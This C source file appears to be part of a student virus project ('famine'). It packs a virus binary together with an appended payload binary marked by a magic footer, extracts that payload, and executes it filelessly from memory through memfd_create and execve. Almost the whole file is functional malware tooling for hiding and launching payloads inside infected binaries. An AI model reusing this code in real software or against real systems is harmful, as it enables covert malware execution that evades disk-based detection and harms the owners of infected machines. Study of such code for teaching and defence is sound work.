/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   payload.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/04/15 15:59:25 by mbatty            #+#    #+#             */
/*   Updated: 2026/04/19 11:03:40 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

#include <fcntl.h>
#include <unistd.h>
#include <syscall.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

static uint64_t	min(uint64_t a, uint64_t b)
{
	return (a < b ? a : b);
}

/*
	Packs 2 binaries together, bin1 is later executed and is supposed to unpack bin2

	The resulting binary looks like this:

	bin1 data - bin2 data - footer

	the footer contains 2 magic parts (To check if it is valid) and the size of bin2

	@param bin1_path path to the virus binary
	@param bin2_path path to the payload that will be executed by the virus
	@param resbin_path file in wich the result will be written
*/
void	pack_payload(const char *bin1_path, const char *bin2_path, const char *resbin_path)
{
	int	bin1_fd = open(bin1_path, O_RDONLY);
	int	bin2_fd = open(bin2_path, O_RDONLY);
	int	resbin_fd = open(resbin_path, O_WRONLY | O_CREAT | O_TRUNC, 0777);

	struct stat	stats;

	char	buf[4096];
	ssize_t	size;

	fstat(bin1_fd, &stats);

	t_footer	bin1_footer = get_footer(bin1_path);
	if (bin1_footer.magic != FOOTER_MAGIC)
		bin1_footer.payload_size = 0;

	ssize_t	bin1_size_to_write = stats.st_size - (bin1_footer.payload_size + sizeof(t_footer));

	do {
		size = read(bin1_fd, buf, min(bin1_size_to_write, sizeof(buf)));
		bin1_size_to_write -= size;
		write(resbin_fd, buf, size);
	} while (size != -1 && size != 0);

	do {
		size = read(bin2_fd, buf, sizeof(buf));
		write(resbin_fd, buf, size);
	} while (size != -1 && size != 0);

	fstat(bin2_fd, &stats);

	t_footer	footer = {
		.magic = FOOTER_MAGIC,
		.payload_size = stats.st_size,
		.signature = SIGNATURE_STR,
	};

	write(resbin_fd, &footer, sizeof(t_footer));

	close(bin1_fd);
	close(bin2_fd);
	close(resbin_fd);
}

t_footer	get_footer(const char *path)
{
	t_footer	footer = {0};

	int	fd = open(path, O_RDONLY);
	if (fd == -1)
		return (footer);

	lseek(fd, -sizeof(t_footer), SEEK_END);

	read(fd, &footer, sizeof(footer));
	close(fd);
	return (footer);
}

/*
	Extracts payload from file (bin2 from pack_payload)

	@param path path of the file from wich to extract the payload
	@param data adress to a pointer that will be set to the raw data of the payload
	@param size size of the extracted data
*/
int	extract_payload(const char *path, uint8_t **data, uint64_t *size)
{
	t_footer	footer = get_footer(path);

	if (footer.magic != FOOTER_MAGIC)
		return (-1);

	int	fd = open(path, O_RDONLY);
	if (fd == -1)
	{
		free(*data);
		return (-1);
	}

	*size = footer.payload_size;

	lseek(fd, -(sizeof(t_footer) + *size), SEEK_END);

	*data = malloc(*size);
	if (*data == NULL)
	{
		close(fd);
		return (-1);
	}

	ssize_t	read_size = read(fd, *data, *size);
	if (read_size == -1 || (uint64_t)read_size != *size)
	{
		close(fd);
		free(*data);
		return (-1);
	}

	close(fd);
	return (0);
}

/*
	Executes the payload using execve
	SYS_memfd_create is used to create a temporary file in RAM

	@param ctx context, used for argv and envp
	@param data data from extract_payload
	@param size size from extract_payload
*/
int	exec_payload(t_exec_ctx *ctx, uint8_t *data, uint64_t size)
{
	int fd = syscall(SYS_memfd_create, "payload", 0);
	write(fd, data, size);
	free(data);

	char path[256] = {0};
	sprintf(path, "/proc/self/fd/%d", fd);

	execve(path, ctx->av, ctx->envp);
	exit(0);
}
